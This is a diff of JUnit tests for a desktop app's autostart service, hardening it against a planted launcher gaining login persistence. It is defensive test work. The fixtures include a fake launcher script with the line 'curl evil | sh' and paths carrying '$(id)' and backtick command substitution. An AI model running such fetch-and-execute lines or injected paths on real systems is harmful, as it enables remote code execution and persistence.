@@ -11,6 +11,7 @@ import java.nio.file.Path;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertNotEquals;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
@@ -35,8 +36,8 @@ class AutostartServiceTest {
                 "the group header must be the first line");
         assertTrue(entry.contains("Type=Application"));
         assertTrue(entry.contains("Name=Salah Guardian"));
-        assertTrue(entry.contains("Exec=/opt/salahguardian/bin/SalahGuardian --minimised"),
-                "autostart must launch straight into the tray");
+        assertTrue(entry.contains("Exec=\"/opt/salahguardian/bin/SalahGuardian\" --minimised"),
+                "the path must be quoted per the desktop entry spec, and start in the tray");
         assertTrue(entry.contains("Terminal=false"));
         assertTrue(entry.contains("X-GNOME-Autostart-enabled=true"));
         assertTrue(entry.endsWith("\n"), "desktop entries should end with a newline");
@@ -78,22 +79,30 @@ class AutostartServiceTest {
     }
 
     @Test
-    @DisplayName("prefers the jpackage app path when the JVM provides one")
-    void prefersJpackageAppPath(@TempDir Path dir) throws IOException {
-        Path launcher = dir.resolve("SalahGuardian");
-        Files.writeString(launcher, "#!/bin/sh\n", StandardCharsets.UTF_8);
-        assertTrue(launcher.toFile().setExecutable(true));
+    @DisplayName("refuses a launcher outside the trusted install locations")
+    void refusesUntrustedLauncher(@TempDir Path dir) throws IOException {
+        // This is the SG-H-07 attack: a launcher the attacker placed somewhere
+        // they control. Even announced through jpackage.app-path it must be
+        // refused, or enabling "start on login" grants them persistence.
+        Path planted = dir.resolve("SalahGuardian");
+        Files.writeString(planted, "#!/bin/sh\ncurl evil | sh\n", StandardCharsets.UTF_8);
+        assertTrue(planted.toFile().setExecutable(true));
 
         String previous = System.getProperty("jpackage.app-path");
-        System.setProperty("jpackage.app-path", launcher.toString());
+        System.setProperty("jpackage.app-path", planted.toString());
         try {
             AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
-            assertEquals(launcher.toString(), service.resolveExecutable().orElseThrow());
+            // A real installation may legitimately be present on the build
+            // machine, so assert on which path is chosen rather than on there
+            // being none: the planted one must never win.
+            assertNotEquals(planted.toString(), service.resolveExecutable().orElse(""),
+                    "a launcher under /tmp must never become an autostart target");
 
-            assertTrue(service.enable());
-            assertTrue(service.isEnabled());
-            String written = Files.readString(dir.resolve("salah-guardian.desktop"));
-            assertTrue(written.contains("Exec=" + launcher + " --minimised"));
+            if (service.enable()) {
+                String written = Files.readString(dir.resolve("salah-guardian.desktop"));
+                assertFalse(written.contains(planted.toString()),
+                        "the written entry must not reference the planted binary");
+            }
         } finally {
             if (previous == null) {
                 System.clearProperty("jpackage.app-path");
@@ -101,6 +110,40 @@ class AutostartServiceTest {
                 System.setProperty("jpackage.app-path", previous);
             }
         }
+    }
+
+    @Test
+    @DisplayName("the working directory can no longer dictate the autostart target")
+    void ignoresWorkingDirectory(@TempDir Path dir) throws IOException {
+        // The removed developmentLauncher() resolved against user.dir, so
+        // launching from an attacker-controlled directory was enough.
+        Path planted = dir.resolve("build/install/salah-guardian/bin");
+        Files.createDirectories(planted);
+        Path launcher = planted.resolve("salah-guardian");
+        Files.writeString(launcher, "#!/bin/sh\n", StandardCharsets.UTF_8);
+        assertTrue(launcher.toFile().setExecutable(true));
+
+        String previous = System.getProperty("user.dir");
+        System.setProperty("user.dir", dir.toString());
+        try {
+            AutostartService service = new AutostartService(dir.resolve("salah-guardian.desktop"));
+            assertNotEquals(launcher.toString(), service.resolveExecutable().orElse(""),
+                    "user.dir must have no influence on what runs at login");
+        } finally {
+            System.setProperty("user.dir", previous);
+        }
+    }
+
+    @Test
+    @DisplayName("quotes and escapes the Exec path")
+    void quotesExecPath() {
+        assertEquals("\"/opt/salah-guardian/bin/SalahGuardian\"",
+                AutostartService.quoteExec("/opt/salah-guardian/bin/SalahGuardian"));
+        // A space would otherwise split the command; the reserved characters
+        // would otherwise be interpreted by the launching shell.
+        assertEquals("\"/home/a b/app\"", AutostartService.quoteExec("/home/a b/app"));
+        assertTrue(AutostartService.quoteExec("/tmp/$(id)").contains("\\$"));
+        assertTrue(AutostartService.quoteExec("/tmp/`id`").contains("\\`"));
     }
 
     @Test
